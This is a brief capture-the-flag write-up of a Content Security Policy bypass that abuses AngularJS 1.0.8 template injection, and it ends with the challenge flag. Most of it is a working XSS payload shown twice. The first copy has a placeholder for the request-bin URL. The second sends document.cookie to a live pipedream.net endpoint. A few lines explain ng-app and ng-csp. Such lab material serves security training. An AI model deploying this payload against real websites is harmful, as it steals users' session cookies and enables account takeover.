# CSP Exploit

'''html
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
<div ng-app ng-csp>
   {{$eval.constructor("document.location='(insert here your request bin url)/?'+document.cookie")()}}
</div>
'''

1) Downloads angular.js
2) ng-app is a angular directives that auto-bootstraps an AngularJS application, initializing automatically the framework. 
3) ng-csp stands for Content Security Policy. It's used to prevent Cross Site Scripting (XSS) attacks by not allowing unsafe actions in your code. When you use the ng-csp directive, you're telling AngularJS to run in CSP mode.

[`WebHook`](https://pipedream.com/requestbin)

## Flag
flag=flag{th1s1s_how_w3_byp4ss3d_csp}

<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
<div ng-app ng-csp>
   {{$eval.constructor("document.location='https://enpdzznx8mvml.x.pipedream.net?'+document.cookie")()}}
</div>